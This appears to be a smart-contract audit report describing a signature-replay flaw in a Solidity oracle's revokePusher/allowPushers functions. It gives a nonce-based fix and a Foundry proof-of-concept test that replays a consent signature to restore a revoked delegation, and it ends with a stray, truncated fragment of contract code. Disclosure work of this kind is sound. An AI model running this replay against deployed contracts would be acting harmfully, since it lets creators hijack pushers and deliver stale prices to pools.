### Title
`revokePusher()` is ineffective against consent-signature replay in `allowPushers()` — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary
`CompressedOracleV1.revokePusher()` clears `namespaceRemapping[msg.sender]` but does not invalidate the pusher's previously-signed consent. Because `allowPushers` performs no used-signature tracking, a creator who holds a still-valid (non-expired) consent can immediately replay it to re-establish the delegation the pusher just revoked. The code's own comment acknowledges the replay risk but the deadline guard it relies on only prevents replay *after* the deadline has passed — it does nothing while the deadline is still in the future.

---

### Finding Description

`allowPushers` requires the pusher's EIP-191 consent signature and a `deadline`:

```solidity
// CompressedOracle.sol L192-L211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
}
```

The inline comment explicitly states the deadline is the only guard against post-revocation replay:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

`revokePusher` only zeroes the mapping:

```solidity
// CompressedOracle.sol L238-L243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

`_ensureDeadline` is:

```solidity
// OracleBase.sol L124-L126
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
```

There is no used-signature registry, no per-pusher revocation nonce, and no check that the consent was signed *after* the most recent revocation. A creator who stored the original consent bytes can call `allowPushers` again with the identical `(deadline, sig)` pair the moment the pusher's `revokePusher()` transaction is mined, as long as `block.timestamp <= deadline`. With a far-future deadline (e.g. `type(uint256).max`, which `_ensureDeadline` accepts), the consent is permanently replayable.

This is the direct analog of the external report: in `SuperVault`, a zero nonce can be *used* in `authorizeOperator` but cannot be *cancelled* in `invalidateNonce`. Here, a consent signature can be *used* in `allowPushers` but cannot be *cancelled* by `revokePusher` — the revocation state is overwritten on the very next `allowPushers` call.

---

### Impact Explanation

After a pusher calls `revokePusher()` intending to redirect their pushes to their own namespace, the creator replays the consent and `namespaceRemapping[pusher]` is restored to `creator`. Every subsequent fallback push by the pusher lands in the creator's namespace instead of the pusher's own. Any pool or price provider reading from the pusher's own namespace (`feedIdOf(pusher, …)`) receives a stale or zero price, satisfying the **bad-price execution** impact criterion: a stale bid/ask quote reaches pool swaps that depend on the pusher's own feed namespace.

---

### Likelihood Explanation

The creator naturally retains the consent bytes — they submitted them in the original `allowPushers` call. No additional off-chain capability is required. The replay succeeds in the same block as the pusher's revocation transaction, making front-running trivial. Any creator with a non-expired consent signature can exercise this indefinitely.

---

### Recommendation

Add a per-pusher revocation nonce. Increment it in `revokePusher` and bind it into the consent hash in `allowPushers`. Any previously-signed consent becomes invalid the moment the pusher revokes.

```solidity
mapping(address => uint256) public revocationNonce;

function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(
            block.chainid, address(this), deadline,
            pusher, msg.sender,
            revocationNonce[pusher]   // <-- bind current nonce
        ))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
}

function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    revocationNonce[msg.sender]++;   // <-- invalidate all prior consents
    emit PusherRevoked(msg.sender, creator);
}
```

### Proof of Concept

```solidity
function testRevokePusherReplayAttack() public {
    // Pusher signs consent with a far-future deadline
    uint256 deadline = type(uint256).max;
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: Pusher revokes — expects to push to own namespace from now on
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: Creator replays the SAME signature — succeeds because deadline is still valid
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator); // delegation silently restored

    // Step 4: Pusher's push still lands in creator's namespace, not pusher's own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(900_000, 5, 0);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(2, 3, raw, tsMs));
    assertTrue(ok);

    // Creator namespace updated — pusher's own namespace stays zero (stale)
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 2, 3)).price,
        U64x32.decode(uint32(raw >> 16))
    );
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 2, 3)).price, 0);
}

    ///         deadline is likewise required: the signed consent carries no timestamp of

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
